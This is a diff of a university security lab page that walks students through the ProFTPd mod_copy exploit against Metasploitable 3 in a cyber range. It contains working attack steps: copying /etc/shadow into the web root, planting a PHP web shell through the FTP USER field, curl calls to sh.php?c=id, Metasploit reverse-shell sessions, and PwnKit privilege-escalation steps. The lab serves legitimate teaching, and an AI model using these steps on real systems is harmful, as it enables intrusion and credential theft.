+  <p>Two screenshots: <strong>(a)</strong> Terminal A showing the <code>250 Copy successful</code> reply from <code>SITE CPTO</code>; <strong>(b)</strong> Terminal B showing <code>curl http://$TARGET/sh.php?c=id</code> returning <code>uid=33(www-data)</code>. One short paragraph in your team notes: <em>in your own words, what one line of code in <code>mod_copy.c</code> — if it had been written — would have stopped this entire attack chain?</em></p>
 </div>
 
 <div class="exercise">
   <div class="ex-label">Try it · why two terminals?</div>
-  <p>The exploit needs <em>two</em> <code>nc</code> connections — one to port 21 and another to port 6200. What's the role of each? What would happen if you tried to do both from a single <code>nc</code> session?</p>
-  <details><summary>Show answer</summary><div>The first <code>nc</code> session (port 21) delivers the trigger: <code>USER ...:)</code> + <code>PASS ...</code>. vsftpd reacts by forking <code>/bin/sh</code> and binding it to port 6200 — but that shell is its own process, listening on a different port. The second <code>nc</code> session (port 6200) attaches to <em>that</em> shell so you can type commands into it. A single <code>nc</code> session can only talk to one port at a time; it can't simultaneously be the FTP client AND the shell client. Two listeners → two connections → two terminals.</div></details>
+  <p>The exploit needs <em>two</em> connections — one to port 21 (FTP) and another to port 80 (HTTP). What's the role of each? What would happen if you tried to do everything from a single <code>nc</code> session?</p>
+  <details><summary>Show answer</summary><div>The FTP session (port 21) is what arms the bug: it sends the <code>SITE CPFR</code>/<code>CPTO</code> commands that copy a file (or a poisoned log file) into the web root. The HTTP session (port 80) is what <em>fetches</em> that file from Apache — and, if the file is PHP, triggers code execution as <code>www-data</code>. Two protocols on two ports: the FTP daemon plants the file; the HTTP daemon executes it. A single <code>nc</code> session can only speak one protocol at a time. You could use <code>nc</code> for the HTTP fetch too instead of <code>curl</code> — manually typing <code>GET /sh.php?c=id HTTP/1.0\r\n\r\n</code> — but <code>curl</code> is one line shorter.</div></details>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">Try it · what does the daemon's user account let you read?</div>
+  <p>ProFTPd runs as <code>root</code> in the default Metasploitable 3 setup. When the <code>SITE CPFR</code>/<code>CPTO</code> copy actually happens, the file IO runs with the daemon's permissions — i.e., as <code>root</code>. So the FTP <em>copy</em> can read <code>/etc/shadow</code>. But when you then <code>curl</code> the file out of the web root, Apache is serving it as <code>www-data</code>. Does the file's content show up to you? Why or why not?</p>
+  <details><summary>Show answer</summary><div>Yes, it shows up. Here's why: the <em>copy</em> creates a new file at <code>/var/www/html/leak</code> with the daemon's identity, but the resulting file's permissions are typically world-readable (mode 644 by default, depending on the daemon's <code>umask</code>). Apache, running as <code>www-data</code>, can open and serve that file because everyone can read it — the contents of <code>/etc/shadow</code> have been "laundered" through the copy into a world-readable file. <strong>This is the core insight of confused-deputy attacks:</strong> a privileged process (ProFTPd as root) performs an operation on behalf of an unprivileged caller (you) and ends up handing you something you couldn't get directly. Try it in the cyber range: <code>SITE CPFR /etc/shadow</code> + <code>SITE CPTO /var/www/html/shadow.txt</code> + <code>curl http://$TARGET/shadow.txt</code>. If the daemon's umask leaves the new file world-readable, you'll see the hashes.</div></details>
 </div>
 
 <!-- ============================================================ -->
@@ -464,44 +487,50 @@ exit                 # close the shell</code></pre>
        =[ metasploit v6.3.x-dev                          ]
 + -- --=[ 2300+ exploits - 1200+ auxiliary - 400+ post   ]
 
-<span class="msf-line" data-explain="Search the module database for anything related to vsftpd.">msf6 &gt; <span class="term-cmd">search vsftpd</span></span>
-   #  Name                                       Disclosure Date  Rank
-   -  ----                                       ---------------  ----
-   0  exploit/unix/ftp/vsftpd_234_backdoor        2011-07-03        excellent
+<span class="msf-line" data-explain="Search the module database for anything related to ProFTPd.">msf6 &gt; <span class="term-cmd">search proftpd</span></span>
+   #  Name                                              Disclosure Date  Rank
+   -  ----                                              ---------------  ----
+   0  exploit/unix/ftp/proftpd_modcopy_exec             2015-04-22        great
 
-<span class="msf-line" data-explain="Select the module — load it as the active context for the next commands.">msf6 &gt; <span class="term-cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span></span>
-[*] No payload configured, defaulting to cmd/unix/interact
+<span class="msf-line" data-explain="Select the module — load it as the active context for the next commands.">msf6 &gt; <span class="term-cmd">use exploit/unix/ftp/proftpd_modcopy_exec</span></span>
+[*] No payload configured, defaulting to cmd/unix/reverse_perl
 
-<span class="msf-line" data-explain="Show every parameter the module accepts. RHOSTS (target host) is the only required one with no default.">msf6 exploit(...) &gt; <span class="term-cmd">show options</span></span>
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s)
-   RPORT   21               yes       The target port (TCP)
+<span class="msf-line" data-explain="Show every parameter the module accepts. RHOSTS (target), SITEPATH (web root the FTP daemon can write to), and TARGETURI (URL prefix Apache serves that path at) are the three required ones.">msf6 exploit(...) &gt; <span class="term-cmd">show options</span></span>
+   Name        Current Setting   Required  Description
+   ----        ---------------   --------  -----------
+   RHOSTS                        yes       The target host(s)
+   RPORT       80                yes       HTTP port to fetch the payload
+   RPORT_FTP   21                yes       The target FTP port
+   SITEPATH    /var/www          yes       Absolute writable web root
+   TARGETURI   /                 yes       Base URI from which SITEPATH is served
+   TMPPATH     /tmp              yes       Absolute writable path for staging
 
 <span class="msf-line" data-explain="Set the target host. Replace 10.0.0.6 with your $TARGET.">msf6 exploit(...) &gt; <span class="term-cmd">set RHOSTS 10.0.0.6</span></span>
 RHOSTS =&gt; 10.0.0.6
 
-<span class="msf-line" data-explain="Fire the exploit. Metasploit performs the same two-step dance you did by hand: USER hacker:) / PASS junk on port 21, then connect to port 6200 and attach to the shell.">msf6 exploit(...) &gt; <span class="term-cmd">run</span></span>
-[*] 10.0.0.6:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.0.0.6:21 - USER: 331 Please specify the password.
-[+] 10.0.0.6:21 - <span class="term-hl">Backdoor service has been spawned, handling...</span>
-[+] 10.0.0.6:21 - UID: uid=0(root) gid=0(root)
-[*] Found shell.
-[*] Command shell session 1 opened (10.0.0.5:43210 -&gt; 10.0.0.6:6200)
+<span class="msf-line" data-explain="Metasploitable 3's Apache serves /var/www/html at the root URL, so we point SITEPATH there.">msf6 exploit(...) &gt; <span class="term-cmd">set SITEPATH /var/www/html</span></span>
+SITEPATH =&gt; /var/www/html
 
-<span class="msf-line" data-explain="You are now in the same shell you opened by hand in step 6.2.">id</span>
-uid=0(root) gid=0(root)</pre>
+<span class="msf-line" data-explain="Fire the exploit. Metasploit performs the same dance you did by hand: USER ＜?php ...＞ to plant code in the FTP log, SITE CPFR/CPTO to copy the log to the web root with a .php extension, then HTTP GET to execute it.">msf6 exploit(...) &gt; <span class="term-cmd">run</span></span>
+[*] 10.0.0.6:80 - 10.0.0.6:21 - Connecting to FTP server 10.0.0.6:21...
+[*] 10.0.0.6:80 - 10.0.0.6:21 - Sending copy commands to FTP server
+[+] 10.0.0.6:80 - <span class="term-hl">Executing PHP payload /odXXXXXXX.php</span>
+[*] Sending stage (39927 bytes) to 10.0.0.6
+[*] Command shell session 1 opened (10.0.0.5:4444 -&gt; 10.0.0.6:51234)
+
+<span class="msf-line" data-explain="You are now in the same www-data shell you opened by hand in step 6.3.">id</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
   <div class="msf-explain" id="msf-explain">Hover any highlighted line for an explanation.</div>
 </div>
 
-<p>That's it. The framework connected to port 21, sent <code>USER xxx:)</code> and <code>PASS xxx</code>, then opened a TCP connection to port 6200 and attached it to your terminal as a managed session. It is <strong>exactly</strong> the manual exploit you ran in section 6 — wrapped in a session manager, a payload selector, and a logging system.</p>
+<p>That's it. The framework opened the FTP connection, planted PHP code in the daemon's log via the <code>USER</code> argument, ran <code>SITE CPFR</code>/<code>CPTO</code> to copy the log into the web root, and then fetched the planted file over HTTP — exactly the same chain you ran by hand in §6.3, wrapped in a session manager, a payload selector, and a logging system.</p>
 
 <p>This is the pattern for the rest of the semester: <strong>read the protocol, do it by hand once to internalize the mechanics, then use the framework module after you understand what it is doing.</strong></p>
 
 <div class="exercise">
   <div class="ex-label">Try it · match the manual steps to msfconsole's output</div>
-  <p>Three things you did manually in §6: <strong>(a)</strong> opened a <code>nc</code> connection to port 21; <strong>(b)</strong> sent <code>USER hacker:)</code> followed by <code>PASS whatever</code>; <strong>(c)</strong> opened a second <code>nc</code> connection to port 6200 to attach to the shell. Which lines in the msfconsole output above correspond to each step?</p>
-  <details><summary>Show answer</summary><div><strong>(a)</strong> → <code>[*] 10.0.0.6:21 - Banner: 220 (vsFTPd 2.3.4)</code> — Metasploit opened the connection and received the FTP banner. <strong>(b)</strong> → <code>[*] 10.0.0.6:21 - USER: 331 Please specify the password.</code> — Metasploit sent <code>USER xxx:)</code> and got the 331 response; the <code>PASS</code> happened invisibly right after, and the next line (<code>[+] Backdoor service has been spawned, handling...</code>) confirms it tripped the trigger. <strong>(c)</strong> → <code>[*] Command shell session 1 opened (10.0.0.5:43210 -&gt; 10.0.0.6:6200)</code> — Metasploit connected to port 6200 and attached the shell to your terminal as a managed "session." Same three steps; you just typed five characters of slash-command instead of two terminals.</div></details>
+  <p>Three things you did manually in §6.3: <strong>(a)</strong> opened a <code>nc</code> connection to port 21 and sent <code>USER &lt;?php ... ?&gt;</code> to plant code in the log; <strong>(b)</strong> sent <code>SITE CPFR /var/log/proftpd/proftpd.log</code> + <code>SITE CPTO /var/www/html/sh.php</code> to copy it into the web root; <strong>(c)</strong> opened a <code>curl</code> to <code>http://$TARGET/sh.php?c=id</code> to execute it. Which lines in the msfconsole output above correspond to each step?</p>
+  <details><summary>Show answer</summary><div><strong>(a)</strong> → <code>[*] 10.0.0.6:80 - 10.0.0.6:21 - Connecting to FTP server 10.0.0.6:21...</code> — Metasploit opened the FTP control connection (the planting of code in the log happens silently with a crafted <code>USER</code> on the next exchange, hidden inside the framework). <strong>(b)</strong> → <code>[*] 10.0.0.6:80 - 10.0.0.6:21 - Sending copy commands to FTP server</code> — the two <code>SITE</code> commands that move the log file into Apache's web root. <strong>(c)</strong> → <code>[+] 10.0.0.6:80 - Executing PHP payload /odXXXXXXX.php</code> + <code>Command shell session 1 opened</code> — Metasploit performs the HTTP fetch that triggers the payload, then attaches the resulting reverse shell to your terminal as a managed "session." Same three steps; you just typed five characters of slash-command instead of two terminals.</div></details>
 </div>
 
 <div class="callout insight keep-in-present">
@@ -516,12 +545,17 @@ uid=0(root) gid=0(root)</pre>
 
 <div class="exercise">
   <div class="ex-label">reflection · pre-auth severity</div>
-  <p>You got root without ever logging in — no real username, no real password. Bugs like that are called <strong>pre-authentication</strong> vulnerabilities. Why are they more dangerous than bugs that only work after someone legitimately logs in?</p>
+  <p>You got code execution without ever logging in — no real username, no real password. Bugs like that are called <strong>pre-authentication</strong> vulnerabilities. Why are they more dangerous than bugs that only work after someone legitimately logs in?</p>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">reflection · the missing line</div>
+  <p>The whole CVE is a single missing check. Read the Python sketch in §5 again — the difference between <code>cpfr_correct</code> and <code>cpfr_proftpd_135</code> is one <code>if</code> statement. Why do you think this kind of bug is so common across software, and what process changes might catch it before release? (Code review checklists? Authentication-required default decorators? Compiler-enforced caller assertions?) Pick one and argue for it in three sentences.</p>
 </div>
 
 <div class="exercise">
   <div class="ex-label">reflection · framework value</div>
-  <p>You could write a one-line bash script that automates sections 6.1 and 6.2. What does Metasploit add <strong>on top of</strong> that script? Think about post-exploitation modules, payload selection, session handling, and what happens when you have ten targets instead of one.</p>
+  <p>You could write a 20-line bash script that automates §6.1 through §6.3. What does Metasploit add <strong>on top of</strong> that script? Think about post-exploitation modules, payload selection, session handling, and what happens when you have ten targets instead of one.</p>
 </div>
 
 <!-- ============================================================ -->
@@ -532,9 +566,9 @@ uid=0(root) gid=0(root)</pre>
   <tbody>
     <tr><td>1 · team</td><td>roster + handle + signed contract</td><td>PDF on Gradescope, one per team</td></tr>
     <tr><td>2 · cyber range</td><td>screenshot of <code>ping $TARGET</code> succeeding</td><td>PNG/JPG embedded in PDF</td></tr>
-    <tr><td>3 · recon</td><td>screenshot of <code>nmap -sV</code> showing <code>vsftpd 2.3.4</code></td><td>PNG/JPG embedded in PDF</td></tr>
-    <tr><td>6 · manual exploit</td><td>screenshot of <code>id</code> = <code>uid=0(root)</code> from port 6200</td><td>PNG/JPG embedded in PDF</td></tr>
-    <tr><td>7 · metasploit</td><td>screenshot of the msfconsole session as root</td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>3 · recon</td><td>screenshot of <code>nmap -sV</code> showing <code>ProFTPD 1.3.5</code></td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>6 · manual exploit</td><td>two screenshots: (a) Terminal A with <code>250 Copy successful</code> reply; (b) Terminal B with <code>curl ... ?c=id</code> returning <code>uid=33(www-data)</code></td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>7 · metasploit</td><td>screenshot of the msfconsole session showing <code>www-data</code> shell after <code>run</code></td><td>PNG/JPG embedded in PDF</td></tr>
     <tr><td>8 · reflection</td><td>three short paragraphs, one per prompt</td><td>same PDF, last page</td></tr>
   </tbody>
 </table>
@@ -545,24 +579,30 @@ uid=0(root) gid=0(root)</pre>
 <h2 id="faq">FAQ</h2>
 
 <h3>The Try-it widget worked; do I still have to do it inside the cyber range?</h3>
-<p>Yes. The widget is a simulation — it teaches the keystrokes. The graded artifacts come from the real Kali ↔ Metasploitable exchange in VCR.</p>
+<p>Yes. The widget is a simulation — and it currently still walks the historical vsftpd&nbsp;2.3.4 backdoor (see the heads-up callout under §Demo). The graded artifacts come from the real Kali ↔ Metasploitable 3 exchange in VCR running the ProFTPd mod_copy chain in §6.</p>
 
-<h3>The smiley trigger seems trivial. Has anything that simple ever shipped in real software since 2011?</h3>
-<p>Yes, and often. The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">XZ-Utils backdoor (CVE-2024-3094, 2024)</a> was a far more sophisticated supply-chain compromise, but at its core it was the same shape: hostile code added to a trusted upstream, triggered by a magic byte sequence, granting pre-auth remote access. The <em>delivery</em> got harder; the <em>idea</em> didn't.</p>
+<h3>A missing auth check seems trivial. Has anything that simple ever shipped in real software since 2015?</h3>
+<p>Constantly. The "<em>side-door command handler that forgot to check authentication</em>" is one of the most reliable shapes in the CVE database. Recent examples in the same family: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22515">Atlassian Confluence CVE-2023-22515</a> (a setup endpoint reachable post-install with no auth check), <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0204">Fortinet FortiSIEM CVE-2024-0204</a> (admin-creation endpoint with bypass). Different products, different decades, same one-line bug.</p>
+
+<h3>And for the <em>backdoor</em> shape — has any malicious code in the distribution chain hit since the vsftpd story?</h3>
+<p>Yes. The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">XZ-Utils backdoor (CVE-2024-3094, 2024)</a> was a far more sophisticated supply-chain compromise that nearly made it into stable Linux distributions before a Microsoft engineer noticed an unusual latency. At its core it was the same shape as the vsftpd 2.3.4 incident: hostile code added to a trusted upstream, triggered by a magic input, granting pre-auth remote access. The <em>delivery</em> got harder; the <em>idea</em> didn't. The historical-context callout in §5 walks the contrast in more detail.</p>
 
 <h3>Why netcat instead of an FTP client?</h3>
-<p>Because FTP clients normalize input. An FTP client would refuse to send <code>USER hacker:)</code> verbatim, or would sanitize the colon, or would helpfully add a <code>:</code> for you. <code>nc</code> sends the bytes you typed. For exploitation work, you almost always want a raw TCP client — <code>nc</code>, <code>ncat</code>, <code>socat</code>, or your own Python socket script — not a protocol-aware client.</p>
+<p>Because FTP clients normalize input. A real client would refuse to send <code>USER &lt;?php ... ?&gt;</code> verbatim, or would sanitize the angle brackets, or would never let you issue <code>SITE CPFR</code> before a successful <code>USER</code>/<code>PASS</code>. <code>nc</code> sends the bytes you typed. For exploitation work, you almost always want a raw TCP client — <code>nc</code>, <code>ncat</code>, <code>socat</code>, or your own Python socket script — not a protocol-aware client that "helps" you.</p>
 
 <h3>I want to see the actual Metasploit module source.</h3>
-<p>On Kali, <code>cat /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb</code>. It's about 40 lines of Ruby — read it line by line and compare to what you did by hand in section 6.</p>
+<p>On Kali, <code>cat /usr/share/metasploit-framework/modules/exploits/unix/ftp/proftpd_modcopy_exec.rb</code>. It's about 120 lines of Ruby — read it line by line and compare to what you did by hand in §6.3.</p>
+
+<h3>I want a root shell, not just <code>www-data</code>. How?</h3>
+<p>Privilege escalation — a second exploit that turns a low-privilege shell into a higher-privilege one. Metasploitable 3 (Ubuntu 14.04 base) is vulnerable to several local privesc CVEs, most famously <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034">PwnKit (CVE-2021-4034)</a> in <code>pkexec</code>. The Metasploit module is <code>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</code>. From your <code>www-data</code> shell, background the session (<kbd>Ctrl</kbd>+<kbd>Z</kbd>), <code>use</code> the privesc module, set <code>SESSION</code> to the backgrounded id, and <code>run</code>. <a href="../lab-10/pentest.html">Lab 10 (agentic pentesting)</a> walks the full <em>initial-access → privesc → post-exploit</em> chain with an agent doing each step.</p>
 
 <footer>
-DS 6042 — Lab 00 · orientation + vsftpd 2.3.4 backdoor walkthrough. Interactive build by Daniel Graham &amp; Claude, following the lab style codified in <code>CLAUDE.md</code>. Module source: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb"><code>vsftpd_234_backdoor.rb</code></a>.
+DS 6042 — Lab 00 · orientation + ProFTPd mod_copy walkthrough. Interactive build by Daniel Graham &amp; Claude, following the lab style codified in <code>CLAUDE.md</code>. Module source: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/proftpd_modcopy_exec.rb"><code>proftpd_modcopy_exec.rb</code></a>.
 </footer>
 
 </main>
 
 <script src="../_shared/lab-base.js?v=5"></script>
-<script src="viz.js?v=7"></script>
+<script src="viz.js?v=9"></script>
 </body>
 </html>
